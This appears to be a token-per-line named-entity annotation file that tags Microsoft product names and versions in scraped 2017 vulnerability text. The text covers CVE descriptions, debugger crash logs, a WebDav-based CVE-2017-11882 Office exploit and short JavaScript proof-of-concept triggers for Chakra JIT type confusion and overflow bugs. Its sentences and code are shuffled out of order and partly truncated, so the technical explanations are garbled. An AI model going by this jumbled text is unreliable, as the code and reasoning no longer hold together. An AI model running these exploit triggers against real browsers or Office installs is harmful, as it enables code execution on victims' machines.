becomes O
negative O
, O
RegExpBase O
: O
:EnsureSpace O
would O
simply O
return O
because O
of O
the O
first O
if O
( O
) O
statement O
without O
attempting O
to O
extend O
the O
buffer O
. O

Debug O
log O
( O
from O
IE O
, O
but O
it O
looks O
similar O
in O
the O
WPAD O
service O
) O
: O
( O
b90.698 O
) O
: O
Access O
violation O
- O
code O
c0000005 O
( O
first O
chance O
) O
First O
chance O
exceptions O
are O
reported O
before O
any O
exception O
handling O
. O

RegExpComp O
: O
:Compile O
is O
responsible O
for O
compiling O
a O
RegExp O
object O
. O

It O
maintains O
a O
buffer O
with O
the O
compilation O
result O
and O
extends O
it O
when O
necessary O
. O

The O
issue O
has O
been O
verified O
on O
64-bit O
Win7 O
and O
64-bit O
Win10 O
with O
the O
most O
recent O
patches O
applied O
. O

msvcrt O
! O
memcpy+0x1d9 O
: O
000007fe`fefe123d O
668901 O
mov O
word O
ptr O
[ O
rcx O
] O
, O
ax O
ds:00000002`5bb60fe0= O

In O
this O
case O
, O
due O
to O
the O
sizes O
involved O
, O
a O
64-bit O
tab O
process O
would O
most O
likely O
be O
required O
to O
trigger O
the O
issue O
. O

Extending O
the O
buffer O
is O
handled O
using O
RegExpBase O
: O
:EnsureSpace O
which O
looks O
( O
approximately O
) O
like O
: O
void O
RegExpBase O
: O
:EnsureSpace O
( O
int O
desired_size O
) O
{ O
if O
( O
desired_size O
buffer_size O
) O
{ O
if O
( O
2 O
desired_size O
< O
desired_size O
) O
{ O
throw O
an O
exception O
} O
int O
new_size O
= O
2 O
desired_size O
; O
char O
new_buffer O
= O
realloc O
( O
buffer O
, O
new_size O
) O
; O
if O
( O
! O
new_buffer O
) O
{ O
throw O
an O
exception O
} O
buffer O
= O
new_buffer O
; O
buffer_size O
= O
new_size O
; O
} O
} O
Note O
that O
desired_size O
is O
a O
signed O
32-bit O
integer O
. O

ChakraCore O
and O
Microsoft O
Edge O
in O
Windows SN
10 SV
Gold SV
, O
1511 SV
, O
1607 SV
, O
1703 SV
, O
1709 SV
, O
and O
Windows SN
Server SV
2016 SV
allows O
an O
attacker O
to O
execute O
arbitrary O
code O
in O
the O
context O
of O
the O
current O
user O
, O
due O
to O
how O
the O
scripting O
engine O
handles O
objects O
in O
memory O
, O
aka O
Scripting O
Engine O
Memory O
Corruption O
Vulnerability O
. O

This O
CVE O
ID O
is O
unique O
from O
CVE-2017-11886 O
, O
CVE-2017-11890 O
, O
CVE-2017-11893 O
, O
CVE-2017-11894 O
, O
CVE-2017-11895 O
, O
CVE-2017-11901 O
, O
CVE-2017-11903 O
, O
CVE-2017-11905 O
, O
CVE-2017-11907 O
, O
CVE-2017-11908 O
, O
CVE-2017-11909 O
, O
CVE-2017-11910 O
, O
CVE-2017-11911 O
, O
CVE-2017-11912 O
, O
CVE-2017-11913 O
, O
CVE-2017-11914 O
, O
CVE-2017-11916 O
, O
CVE-2017-11918 O
, O
and O
CVE-2017-11930 O
. O

Microsoft O
Edge O
in O
Microsoft SN
Windows SN
10 SV
Gold SV
, O
1511 SV
, O
1607 SV
, O
1703 SV
, O
1709 SV
, O
and O
Windows SN
Server SV
2016 SV
allows O
an O
attacker O
to O
execute O
arbitrary O
code O
in O
the O
context O
of O
the O
current O
user O
, O
due O
to O
how O
Microsoft O
Edge O
handles O
objects O
in O
memory O
, O
aka O
Microsoft O
Edge O
Memory O
Corruption O
Vulnerability O
. O

This O
CVE O
ID O
is O
unique O
from O
CVE-2017-11889 O
, O
CVE-2017-11890 O
, O
CVE-2017-11893 O
, O
CVE-2017-11894 O
, O
CVE-2017-11895 O
, O
CVE-2017-11901 O
, O
CVE-2017-11903 O
, O
CVE-2017-11905 O
, O
CVE-2017-11907 O
, O
CVE-2017-11908 O
, O
CVE-2017-11909 O
, O
CVE-2017-11910 O
, O
CVE-2017-11911 O
, O
CVE-2017-11912 O
, O
CVE-2017-11913 O
, O
CVE-2017-11914 O
, O
CVE-2017-11916 O
, O
CVE-2017-11918 O
, O
and O
CVE-2017-11930 O
. O

This O
CVE O
ID O
is O
unique O
from O
CVE-2017-11882 O
. O

Microsoft SN
Excel SN
2016 SV
Click-to-Run O
( O
C2R O
) O
allows O
an O
attacker O
to O
run O
arbitrary O
code O
in O
the O
context O
of O
the O
current O
user O
by O
failing O
to O
properly O
handle O
objects O
in O
memory O
, O
aka O
Microsoft O
Office O
Memory O
Corruption O
Vulnerability O
. O

This O
CVE O
ID O
is O
unique O
from O
CVE-2017-11884 O
. O

Microsoft SN
Office SN
2007 SV
Service SV
Pack SV
3 SV
, O
Microsoft SN
Office SN
2010 SV
Service SV
Pack SV
2 SV
, O
Microsoft SN
Office SN
2013 SV
Service SV
Pack SV
1 SV
, O
and O
Microsoft SN
Office SN
2016 SV
allow O
an O
attacker O
to O
run O
arbitrary O
code O
in O
the O
context O
of O
the O
current O
user O
by O
failing O
to O
properly O
handle O
objects O
in O
memory O
, O
aka O
Microsoft O
Office O
Memory O
Corruption O
Vulnerability O
. O

However O
with O
help O
of O
WebDav O
it O
is O
possible O
to O
launch O
arbitrary O
attacker-controlled O
executable O
on O
vulnerable O
machine O
. O

These O
objects O
exploits O
CVE-2017-11882 O
, O
which O
results O
in O
sequential O
command O
execution O
. O

The O
reason O
why O
this O
approach O
might O
be O
handy O
is O
a O
limitation O
of O
executed O
command O
length O
. O

This O
exploit O
triggers O
WebClient O
service O
to O
start O
and O
execute O
remote O
file O
from O
attacker-controlled O
WebDav O
server O
. O

This O
script O
creates O
simple O
document O
with O
several O
OLE O
objects O
. O

Microsoft O
Office O
- O
OLE O
Remote O
Code O
Execution O

Microsoft SN
Excel SN
2007 SV
Service SV
Pack SV
3 SV
, O
Microsoft SN
Excel SN
2010 SV
Service SV
Pack SV
2 SV
, O
Microsoft SN
Excel SN
2013 SV
Service SV
Pack SV
1 SV
, O
Microsoft SN
Excel SN
2013 SV
RT SV
Service SV
Pack SV
1 SV
, O
Microsoft SN
Excel SN
2016 SV
, O
Microsoft SN
Office SN
Compatibility SN
Pack SN
Service SV
Pack SV
3 SV
, O
and O
Microsoft SN
Excel SN
Viewer O
2007 SV
Service SV
Pack SV
3 SV
allow O
an O
attacker O
to O
run O
arbitrary O
code O
in O
the O
context O
of O
the O
current O
user O
by O
failing O
to O
properly O
handle O
objects O
in O
memory O
, O
aka O
Microsoft O
Excel O
Memory O
Corruption O
Vulnerability O
. O

ChakraCore O
and O
Microsoft O
Edge O
in O
Windows SN
10 SV
1511 SV
, O
1607 SV
, O
1703 SV
, O
1709 SV
, O
Windows SN
Server SV
2016 SV
and O
Windows SN
Server SV
, O
version SV
1709 SV
allows O
an O
attacker O
to O
gain O
the O
same O
user O
rights O
as O
the O
current O
user O
, O
due O
to O
how O
the O
scripting O
engine O
handles O
objects O
in O
memory O
, O
aka O
Scripting O
Engine O
Memory O
Corruption O
Vulnerability O
. O

This O
CVE O
ID O
is O
unique O
from O
CVE-2017-11836 O
, O
CVE-2017-11837 O
, O
CVE-2017-11838 O
, O
CVE-2017-11839 O
, O
CVE-2017-11840 O
, O
CVE-2017-11841 O
, O
CVE-2017-11843 O
, O
CVE-2017-11846 O
, O
CVE-2017-11858 O
, O
CVE-2017-11859 O
, O
CVE-2017-11861 O
, O
CVE-2017-11862 O
, O
CVE-2017-11866 O
, O
CVE-2017-11869 O
, O
CVE-2017-11870 O
, O
and O
CVE-2017-11871 O
. O

The O
PoC O
shows O
that O
it O
can O
result O
in O
type O
confusion O
. O

So O
it O
fails O
to O
detect O
if O
the O
type O
of O
b O
was O
changed O
after O
the O
OP_Memset O
called O
. O

ChakraCore O
and O
Microsoft O
Edge O
in O
Windows SN
10 SV
1703 SV
, O
1709 SV
, O
and O
Windows SN
Server SV
, O
version SV
1709 SV
allows O
an O
attacker O
to O
gain O
the O
same O
user O
rights O
as O
the O
current O
user O
, O
due O
to O
how O
the O
scripting O
engine O
handles O
objects O
in O
memory O
, O
aka O
Scripting O
Engine O
Memory O
Corruption O
Vulnerability O
. O

This O
CVE O
ID O
is O
unique O
from O
CVE-2017-11836 O
, O
CVE-2017-11837 O
, O
CVE-2017-11838 O
, O
CVE-2017-11839 O
, O
CVE-2017-11840 O
, O
CVE-2017-11841 O
, O
CVE-2017-11843 O
, O
CVE-2017-11846 O
, O
CVE-2017-11858 O
, O
CVE-2017-11859 O
, O
CVE-2017-11861 O
, O
CVE-2017-11862 O
, O
CVE-2017-11866 O
, O
CVE-2017-11869 O
, O
CVE-2017-11870 O
, O
and O
CVE-2017-11873 O
. O

This O
CVE O
ID O
is O
unique O
from O
CVE-2017-11836 O
, O
CVE-2017-11837 O
, O
CVE-2017-11838 O
, O
CVE-2017-11839 O
, O
CVE-2017-11840 O
, O
CVE-2017-11841 O
, O
CVE-2017-11843 O
, O
CVE-2017-11846 O
, O
CVE-2017-11858 O
, O
CVE-2017-11859 O
, O
CVE-2017-11861 O
, O
CVE-2017-11862 O
, O
CVE-2017-11866 O
, O
CVE-2017-11869 O
, O
CVE-2017-11871 O
, O
and O
CVE-2017-11873 O
. O

Source O
: O
the O
following O
JavaScript O
code O
, O
both O
of O
the O
print O
calls O
must O
print O
out O
undefined O
because O
of O
x O
is O
a O
formal O
parameter O
. O

But O
the O
method O
can O
t O
detect O
the O
above O
buggy O
case O
, O
so O
it O
may O
end O
up O
wrongly O
optimizing O
arguments O
. O

But O
the O
second O
print O
call O
prints O
out O
function O
x O

function O
f O
( O
x O
) O
{ O
print O
( O
x O
) O
; O
{ O
function O
x O
print O
( O
x O
) O
; O
} O
The O
following O
code O
in O
PreVisitFunction O
is O
used O
to O
decide O
how O
to O
optimize O
arguments O
. O

This O
bug O
may O
lead O
to O
type O
confusion O
in O
JITed O
code O
. O

function O
f O
( O
x O
) O
{ O
x O
= O
1 O
; O
} O
PoC O
: O
function O
f O
( O
x O
) O
{ O
arguments O
; O
{ O
function O
x O
for O
( O
let O
i O
= O
0 O
; O
i O
< O
10000 O
; O
i++ O
) O
f O
( O
) O
; O

bool O
doStackArgsOpt O
= O
( O
! O
pnode- O
> O
sxFnc.HasAnyWriteToFormals O
( O
) O
|| O
funcInfo- O
> O
GetIsStrictMode O
( O
) O
) O
; O
HasAnyWriteToFormals O
set O
by O
Parser O
: O
:BindPidRefsInScope O
returns O
true O
in O
the O
following O
example O
code O
where O
x O
is O
formal O
. O

Microsoft O
Edge O
Chakra O
JIT O
- O
Incorrect O
Function O
Declaration O
Scope O

Internet O
Explorer O
in O
Microsoft SN
Windows SN
7 SV
SP1 SV
, O
Windows SN
Server SV
2008 SV
and SV
R2 SV
SP1 SV
, O
Windows SN
8.1 SV
and O
Windows SN
RT SV
8.1 SV
, O
Windows SN
Server SV
2012 SV
and SV
R2 SV
, O
Windows SN
10 SV
Gold SV
, O
1511 SV
, O
1607 SV
, O
1703 SV
, O
1709 SV
, O
Windows SN
Server SV
2016 SV
and O
Windows SN
Server SV
, O
version SV
1709 SV
allows O
an O
attacker O
to O
gain O
the O
same O
user O
rights O
as O
the O
current O
user O
, O
due O
to O
how O
Microsoft O
browsers O
handle O
objects O
in O
memory O
, O
aka O
Scripting O
Engine O
Memory O
Corruption O
Vulnerability O
. O

This O
CVE O
ID O
is O
unique O
from O
CVE-2017-11836 O
, O
CVE-2017-11837 O
, O
CVE-2017-11838 O
, O
CVE-2017-11839 O
, O
CVE-2017-11840 O
, O
CVE-2017-11841 O
, O
CVE-2017-11843 O
, O
CVE-2017-11846 O
, O
CVE-2017-11858 O
, O
CVE-2017-11859 O
, O
CVE-2017-11861 O
, O
CVE-2017-11862 O
, O
CVE-2017-11866 O
, O
CVE-2017-11870 O
, O
CVE-2017-11871 O
, O
and O
CVE-2017-11873 O
. O

ChakraCore O
and O
Microsoft O
Edge O
in O
Windows SN
10 SV
Gold SV
, O
1511 SV
, O
1607 SV
, O
1703 SV
, O
1709 SV
, O
Windows SN
Server SV
2016 SV
and O
Windows SN
Server SV
, O
version SV
1709 SV
allows O
an O
attacker O
to O
gain O
the O
same O
user O
rights O
as O
the O
current O
user O
, O
due O
to O
how O
the O
scripting O
engine O
handles O
objects O
in O
memory O
, O
aka O
Scripting O
Engine O
Memory O
Corruption O
Vulnerability O
. O

This O
CVE O
ID O
is O
unique O
from O
CVE-2017-11836 O
, O
CVE-2017-11837 O
, O
CVE-2017-11838 O
, O
CVE-2017-11839 O
, O
CVE-2017-11840 O
, O
CVE-2017-11841 O
, O
CVE-2017-11843 O
, O
CVE-2017-11846 O
, O
CVE-2017-11858 O
, O
CVE-2017-11859 O
, O
CVE-2017-11861 O
, O
CVE-2017-11862 O
, O
CVE-2017-11869 O
, O
CVE-2017-11870 O
, O
CVE-2017-11871 O
, O
and O
CVE-2017-11873 O
. O

ChakraCore O
and O
Microsoft O
Edge O
in O
Windows SN
10 SV
1709 SV
and O
Windows SN
Server SV
, O
version SV
1709 SV
allows O
an O
attacker O
to O
gain O
the O
same O
user O
rights O
as O
the O
current O
user O
, O
due O
to O
how O
the O
scripting O
engine O
handles O
objects O
in O
memory O
, O
aka O
Scripting O
Engine O
Memory O
Corruption O
Vulnerability O
. O

This O
CVE O
ID O
is O
unique O
from O
CVE-2017-11836 O
, O
CVE-2017-11837 O
, O
CVE-2017-11838 O
, O
CVE-2017-11839 O
, O
CVE-2017-11840 O
, O
CVE-2017-11841 O
, O
CVE-2017-11843 O
, O
CVE-2017-11846 O
, O
CVE-2017-11858 O
, O
CVE-2017-11859 O
, O
CVE-2017-11861 O
, O
CVE-2017-11866 O
, O
CVE-2017-11869 O
, O
CVE-2017-11870 O
, O
CVE-2017-11871 O
, O
and O
CVE-2017-11873 O
. O

This O
CVE O
ID O
is O
unique O
from O
CVE-2017-11836 O
, O
CVE-2017-11837 O
, O
CVE-2017-11838 O
, O
CVE-2017-11839 O
, O
CVE-2017-11840 O
, O
CVE-2017-11841 O
, O
CVE-2017-11843 O
, O
CVE-2017-11846 O
, O
CVE-2017-11858 O
, O
CVE-2017-11859 O
, O
CVE-2017-11862 O
, O
CVE-2017-11866 O
, O
CVE-2017-11869 O
, O
CVE-2017-11870 O
, O
CVE-2017-11871 O
, O
and O
CVE-2017-11873 O
. O

Microsoft O
Edge O
in O
Windows SN
10 SV
1607 SV
, O
1703 SV
, O
1709 SV
, O
Windows SN
Server SV
2016 SV
and O
Windows SN
Server SV
, O
version SV
1709 SV
allows O
an O
attacker O
to O
gain O
the O
same O
user O
rights O
as O
the O
current O
user O
, O
due O
to O
how O
the O
scripting O
engine O
handles O
objects O
in O
memory O
, O
aka O
Scripting O
Engine O
Memory O
Corruption O
Vulnerability O
. O

PoC O
: O
function O
f O
( O
) O
{ O
let O
arr O
= O
new O
Uint32Array O
( O
0x1000 O
) O
; O
for O
( O
let O
i O
= O
0 O
; O
i O
< O
0x7fffffff O
; O
) O
{ O
arr O
[ O
++i O
] O
= O
0x1234 O
; O
} O
} O
f O
( O
) O
; O

So O
it O
may O
fail O
to O
check O
integer O
overflow O
on O
64-bit O
system O
. O

But O
the O
size O
of O
IntConstType O
equals O
to O
the O
size O
of O
pointer O
, O
and O
the O
offset O
variable O
is O
used O
as O
a O
32-bit O
integer O
. O

void O
Lowerer O
: O
:LowerBoundCheck O
( O
IR O
: O
:Instr O
const O
instr O
if O
( O
rightOpnd- O
> O
IsIntConstOpnd O
( O
) O
) O
{ O
IntConstType O
newOffset O
; O
if O
( O
! O
IntConstMath O
: O
:Add O
( O
offset O
, O
rightOpnd- O
> O
AsIntConstOpnd O
( O
) O
- O
> O
GetValue O
( O
) O
, O
& O
newOffset O
) O
) O
( O
a O
) O
{ O
offset O
= O
newOffset O
; O
rightOpnd O
= O
nullptr O
; O
offsetOpnd O
= O
nullptr O
if O
( O
! O
rightOpnd O
) O
{ O
rightOpnd O
= O
IR O
: O
:IntConstOpnd O
: O
:New O
( O
offset O
, O
TyInt32 O
, O
func O
At O
( O
a O
) O
, O
it O
uses O
IntConstMath O
: O
:Add O
to O
check O
integer O
overflow O
. O

This O
CVE O
ID O
is O
unique O
from O
CVE-2017-11836 O
, O
CVE-2017-11837 O
, O
CVE-2017-11838 O
, O
CVE-2017-11839 O
, O
CVE-2017-11840 O
, O
CVE-2017-11841 O
, O
CVE-2017-11843 O
, O
CVE-2017-11846 O
, O
CVE-2017-11859 O
, O
CVE-2017-11861 O
, O
CVE-2017-11862 O
, O
CVE-2017-11866 O
, O
CVE-2017-11869 O
, O
CVE-2017-11870 O
, O
CVE-2017-11871 O
, O
and O
CVE-2017-11873 O
. O

ChakraCore O
and O
Internet O
Explorer O
in O
Microsoft SN
Windows SN
7 SV
SP1 SV
, O
Windows SN
Server SV
2008 SV
and SV
R2 SV
SP1 SV
, O
Windows SN
8.1 SV
and O
Windows SN
RT SV
8.1 SV
, O
Windows SN
Server SV
2012 SV
and SV
R2 SV
, O
and O
Microsoft O
Edge O
and O
Internet O
Explorer O
in O
Windows SN
10 SV
Gold SV
, O
1511 SV
, O
1607 SV
, O
1703 SV
, O
1709 SV
, O
Windows SN
Server SV
2016 SV
and O
Windows SN
Server SV
, O
version SV
1709 SV
allows O
an O
attacker O
to O
gain O
the O
same O
user O
rights O
as O
the O
current O
user O
, O
due O
to O
how O
Microsoft O
browsers O
handle O
objects O
in O
memory O
, O
aka O
Scripting O
Engine O
Memory O
Corruption O
Vulnerability O
. O

This O
CVE O
ID O
is O
unique O
from O
CVE-2017-11855 O
. O

Internet O
Explorer O
in O
Microsoft SN
Windows SN
7 SV
SP1 SV
, O
Windows SN
Server SV
2008 SV
SP2 SV
and SV
R2 SV
SP1 SV
, O
Windows SN
8.1 SV
and O
Windows SN
RT SV
8.1 SV
, O
Windows SN
Server SV
2012 SV
R2 SV
, O
Windows SN
10 SV
Gold SV
, O
1511 SV
, O
1607 SV
, O
1703 SV
, O
1709 SV
, O
Windows SN
Server SV
2016 SV
and O
Windows SN
Server SV
, O
version SV
1709 SV
allows O
an O
attacker O
to O
gain O
the O
same O
user O
rights O
as O
the O
current O
user O
, O
due O
to O
how O
Internet O
Explorer O
handles O
objects O
in O
memory O
, O
aka O
Internet O
Explorer O
Memory O
Corruption O
Vulnerability O
. O

Internet O
Explorer O
in O
Microsoft SN
Windows SN
7 SV
SP1 SV
, O
Windows SN
Server SV
2008 SV
SP2 SV
and SV
R2 SV
SP1 SV
, O
Windows SN
8.1 SV
and O
Windows SN
RT SV
8.1 SV
, O
Windows SN
Server SV
2012 SV
and SV
R2 SV
, O
Windows SN
10 SV
Gold SV
, O
1511 SV
, O
1607 SV
, O
1703 SV
, O
1709 SV
, O
Windows SN
Server SV
2016 SV
and O
Windows SN
Server SV
, O
version SV
1709 SV
allows O
an O
attacker O
to O
gain O
the O
same O
user O
rights O
as O
the O
current O
user O
, O
due O
to O
how O
Internet O
Explorer O
handles O
objects O
in O
memory O
, O
aka O
Internet O
Explorer O
Memory O
Corruption O
Vulnerability O
. O

This O
CVE O
ID O
is O
unique O
from O
CVE-2017-11856 O
. O

Debug O
log O
: O
( O
a3c.bd8 O
) O
: O
Access O
violation O
- O
code O
c0000005 O
( O
first O
chance O
) O
First O
chance O
exceptions O
are O
reported O
before O
any O
exception O
handling O
. O

- O
[ O
currently O
untested O
] O
An O
attacker O
on O
the O
local O
network O
could O
exploit O
this O
issue O
by O
posing O
as O
a O
WPAD O
( O
Web O
Proxy O
Auto-Discovery O
) O
host O
and O
sending O
a O
malicious O
wpad.dat O
file O
to O
the O
victim O
. O

jscript O
! O
InvokeDispatch+0xbd O
: O
00007ffa`e45a45fd O
488b4008 O
mov O
rax O
, O
qword O
ptr O
[ O
rax+8 O
] O
ds:0000004e`00610056 O

This O
issue O
could O
potentially O
be O
exploited O
through O
multiple O
vectors O
: O
- O
By O
opening O
a O
malicious O
web O
page O
in O
Internet O
Explorer O
. O

The O
issue O
has O
been O
verified O
on O
64-bit O
Windows O
10 O
with O
the O
most O
recent O
patches O
applied O
. O

Thus O
if O
NameTBL O
: O
:GetVal O
( O
) O
returns O
1 O
, O
ConvertToScalar O
( O
) O
is O
going O
to O
be O
called O
with O
invalid O
arguments O
. O

However O
in O
this O
case O
NameTBL O
: O
:GetVal O
( O
) O
will O
actually O
return O
1 O
. O

Depending O
on O
the O
perceived O
( O
uninitialized O
) O
type O
of O
length O
VAR O
, O
this O
might O
lead O
to O
exploitable O
conditions O
including O
calling O
a O
virtual O
method O
on O
the O
uninitialized O
pointer O
( O
see O
below O
) O
. O

Also O
, O
in O
this O
case O
, O
the O
length O
VAR O
is O
not O
going O
to O
be O
initialized O
. O

PoC O
for O
Internet O
Explorer O
( O
tested O
on O
IE SN
11 SV
with O
a O
64-bit O
tab O
process O
. O

Microsoft SN
Word SN
2007 SV
Service SV
Pack SV
3 SV
, O
Microsoft SN
Word SN
2010 SV
Service SV
Pack SV
2 SV
, O
Microsoft SN
Office SN
2010 SV
Service SV
Pack SV
2 SV
, O
and O
Microsoft SN
Office SN
Compatibility SN
Pack SN
Service SV
Pack SV
3 SV
allow O
an O
attacker O
to O
run O
arbitrary O
code O
in O
the O
context O
of O
the O
current O
user O
by O
failing O
to O
properly O
handle O
objects O
in O
memory O
, O
aka O
Microsoft O
Word O
Memory O
Corruption O
Vulnerability O
. O

ChakraCore O
and O
Internet O
Explorer O
in O
Microsoft SN
Windows SN
7 SV
SP1 SV
, O
Windows SN
Server SV
2008 SV
and SV
R2 SV
SP1 SV
, O
Windows SN
8.1 SV
and O
Windows SN
RT SV
8.1 SV
, O
Windows SN
Server SV
2012 SV
and SV
R2 SV
, O
and O
Microsoft O
Edge O
and O
Internet O
Explorer O
in O
Windows SN
10 SV
Gold SV
, O
1511 SV
, O
1607 SV
, O
1703 SV
, O
1709 SV
, O
Windows SN
Server SV
2016 SV
and O
Windows SN
Server SV
, O
version SV
1709 SV
allows O
an O
attacker O
to O
gain O
the O
same O
user O
rights O
as O
the O
current O
user O
, O
due O
to O
how O
the O
scripting O
engine O
handles O
objects O
in O
memory O
, O
aka O
Scripting O
Engine O
Memory O
Corruption O
Vulnerability O
. O

This O
CVE O
ID O
is O
unique O
from O
CVE-2017-11836 O
, O
CVE-2017-11837 O
, O
CVE-2017-11838 O
, O
CVE-2017-11839 O
, O
CVE-2017-11840 O
, O
CVE-2017-11841 O
, O
CVE-2017-11843 O
, O
CVE-2017-11858 O
, O
CVE-2017-11859 O
, O
CVE-2017-11861 O
, O
CVE-2017-11862 O
, O
CVE-2017-11866 O
, O
CVE-2017-11869 O
, O
CVE-2017-11870 O
, O
CVE-2017-11871 O
, O
and O
CVE-2017-11873 O
. O

Microsoft O
Edge O
in O
Microsoft SN
Windows SN
10 SV
1703 SV
allows O
an O
attacker O
to O
execute O
arbitrary O
code O
in O
the O
context O
of O
the O
current O
user O
, O
due O
to O
how O
Microsoft O
Edge O
handles O
objects O
in O
memory O
, O
aka O
Microsoft O
Edge O
Memory O
Corruption O
Vulnerability O
. O

ChakraCore O
and O
Internet O
Explorer O
in O
Microsoft SN
Windows SN
7 SV
SP1 SV
, O
Windows SN
Server SV
2008 SV
and SV
R2 SV
SP1 SV
, O
Windows SN
8.1 SV
and O
Windows SN
RT SV
8.1 SV
, O
Windows SN
Server SV
2012 SV
R2 SV
, O
and O
Microsoft O
Edge O
and O
Internet O
Explorer O
in O
Windows SN
10 SV
Gold SV
, O
1511 SV
, O
1607 SV
, O
1703 SV
, O
1709 SV
, O
Windows SN
Server SV
2016 SV
and O
Windows SN
Server SV
, O
version SV
1709 SV
allows O
an O
attacker O
to O
gain O
the O
same O
user O
rights O
as O
the O
current O
user O
, O
due O
to O
how O
the O
scripting O
engine O
handles O
objects O
in O
memory O
, O
aka O
Scripting O
Engine O
Memory O
Corruption O
Vulnerability O
. O

This O
CVE O
ID O
is O
unique O
from O
CVE-2017-11836 O
, O
CVE-2017-11837 O
, O
CVE-2017-11838 O
, O
CVE-2017-11839 O
, O
CVE-2017-11840 O
, O
CVE-2017-11841 O
, O
CVE-2017-11846 O
, O
CVE-2017-11858 O
, O
CVE-2017-11859 O
, O
CVE-2017-11861 O
, O
CVE-2017-11862 O
, O
CVE-2017-11866 O
, O
CVE-2017-11869 O
, O
CVE-2017-11870 O
, O
CVE-2017-11871 O
, O
and O
CVE-2017-11873 O
. O

This O
CVE O
ID O
is O
unique O
from O
CVE-2017-11836 O
, O
CVE-2017-11837 O
, O
CVE-2017-11838 O
, O
CVE-2017-11839 O
, O
CVE-2017-11841 O
, O
CVE-2017-11843 O
, O
CVE-2017-11846 O
, O
CVE-2017-11858 O
, O
CVE-2017-11859 O
, O
CVE-2017-11861 O
, O
CVE-2017-11862 O
, O
CVE-2017-11866 O
, O
CVE-2017-11869 O
, O
CVE-2017-11870 O
, O
CVE-2017-11871 O
, O
and O
CVE-2017-11873 O
. O

So O
it O
may O
fail O
to O
detect O
type O
changes O
. O

But O
in O
the O
above O
snippet O
, O
it O
emits O
the O
bailout O
opcode O
in O
the O
first O
analysis O
( O
this- O
> O
IsLoopPrePass O
( O
) O
is O
satisfied O
) O
. O

And O
it O
returns O
false O
in O
the O
second O
analysis O
. O

if O
( O
valueType.CanBeTaggedValue O
valueType.HasBeenNumber O
this- O
> O
IsLoopPrePass O
this- O
> O
currentBlock- O
> O
loop O
) O
) O
{ O
ValueType O
newValueType O
= O
valueType.SetCanBeTaggedValue O
( O
false O
) O
; O
Split O
out O
the O
tag O
check O
as O
a O
separate O
instruction O
. O

In O
the O
first O
analysis O
, O
IsLoopPrePass O
returns O
true O
. O

PoC O
: O
function O
opt O
( O
) O
{ O
let O
obj O
= O
[ O
2.3023e-320 O
] O
; O
for O
( O
let O
i O
= O
0 O
; O
i O
< O
1 O
; O
i++ O
) O
{ O
obj.x O
= O
1 O
; O
In O
the O
first O
analysis O
, O
BailOnNotObject O
emitted O
obj O
= O
+obj O
; O
Change O
the O
type O
obj.x O
= O
1 O
; O
Type O
confusion O
} O
} O
function O
main O
( O
) O
{ O
for O
( O
let O
i O
= O
0 O
; O
i O
< O
1000 O
; O
i++ O
) O
{ O
opt O
main O
( O
) O
; O

IR O
: O
:Instr O
bailOutInstr O
; O
bailOutInstr O
= O
IR O
: O
:BailOutInstr O
: O
:New O
( O
Js O
: O
:OpCode O
: O
:BailOnNotObject O
, O
IR O
: O
:BailOutOnTaggedValue O
, O
instr O
, O
instr- O
> O
m_func O
The O
JIT O
compiler O
analyzes O
a O
loop O
twice O
for O
some O
reasons O
such O
as O
to O
track O
types O
properly O
. O

But O
the O
return O
value O
of O
valueType.HasBeenNumber O
( O
) O
can O
be O
different O
in O
the O
second O
analysis O
. O

Microsoft O
Edge O
in O
Windows SN
10 SV
Gold SV
, O
1511 SV
, O
1607 SV
, O
1703 SV
, O
1709 SV
, O
Windows SN
Server SV
2016 SV
and O
Windows SN
Server SV
, O
version SV
1709 SV
allows O
an O
attacker O
to O
take O
control O
of O
an O
affected O
system O
, O
due O
to O
how O
the O
scripting O
engine O
handles O
objects O
in O
memory O
, O
aka O
Scripting O
Engine O
Memory O
Corruption O
Vulnerability O
. O

This O
CVE O
ID O
is O
unique O
from O
CVE-2017-11836 O
, O
CVE-2017-11837 O
, O
CVE-2017-11838 O
, O
CVE-2017-11840 O
, O
CVE-2017-11841 O
, O
CVE-2017-11843 O
, O
CVE-2017-11846 O
, O
CVE-2017-11858 O
, O
CVE-2017-11859 O
, O
CVE-2017-11861 O
, O
CVE-2017-11862 O
, O
CVE-2017-11866 O
, O
CVE-2017-11869 O
, O
CVE-2017-11870 O
, O
CVE-2017-11871 O
, O
and O
CVE-2017-11873 O
. O

But O
the O
problem O
is O
that O
this O
can O
be O
applied O
to O
constants O
. O

At O
the O
basic O
block O
( O
a O
) O
, O
the O
type O
of O
o O
is O
always O
Object O
. O

So O
it O
leads O
to O
type O
confusion O
at O
the O
basic O
block O
( O
c O
) O
. O

At O
the O
basic O
block O
( O
b O
) O
, O
the O
type O
of O
o O
is O
always O
CanBeTaggedValue_Float O
. O

All O
blocks O
will O
treat O
it O
as O
that O
type O
regardless O
of O
the O
control O
flow O
. O

The O
bailouts O
can O
be O
generated O
when O
inlining O
JavaScript O
functions O
. O

At O
the O
basic O
block O
( O
c O
) O
, O
it O
combines O
the O
two O
types O
, O
and O
marks O
the O
type O
of O
o O
as O
CanBeTaggedValue_Mixed O
( O
Object O
+ O
CanBeTaggedValue_Float O
) O
. O

This O
means O
, O
once O
a O
constant O
is O
marked O
as O
some O
type O
in O
a O
certain O
block O
. O

function O
opt O
( O
inlinee O
) O
{ O
inlinee O
( O
) O
; O
} O
Generated O
IR O
code O
for O
the O
above O
code O
: O
StatementBoundary O
0 O
0000 O
s6.var O
= O
StartCall O
1 O
( O
0x1 O
) O
.i32 O
0000 O
BailOnNotObject O
s3 O
[ O
LikelyCanBeTaggedValue_Object O
] O
.var O
0006 O
Bailout O
: O
0006 O
( O
BailOutOnInlineFunction O
) O
s10.var O
= O
Ld_A O
[ O
s3 O
[ O
LikelyObject O
] O
.var+8 O
] O
.u64 O
0006 O
BailOnNotEqual O
[ O
s10.var O
! O

] O
.i32 O
, O
26 O
( O
0x1A O
) O
.i32 O
Bailout O
: O
0006 O
( O
BailOutOnInlineFunction O
) O
BailOnNotEqual O
[ O
s3 O
[ O
LikelyObject O
] O
.var+40 O
] O
.u64 O
, O
0xXXXXXXXX O
( O
FunctionBody O
[ O
Anonymous O
function O
( O
1.3 O
) O
, O
4 O
] O
) O
.u64 O
Bailout O
: O
0006 O
( O
BailOutOnInlineFunction O
) O
As O
you O
can O
see O
after O
the O
BailOnNotObject O
opcode O
which O
generates O
BailOutOnTaggedValue O
bailouts O
, O
the O
type O
of O
s3 O
becomes O
LikelyObject O
from O
LikelyCanBeTaggedValue_Object O
. O

And O
since O
s2 O
is O
a O
constant O
, O
that O
change O
affects O
the O
basic O
block O
( O
c O
) O
. O

Note O
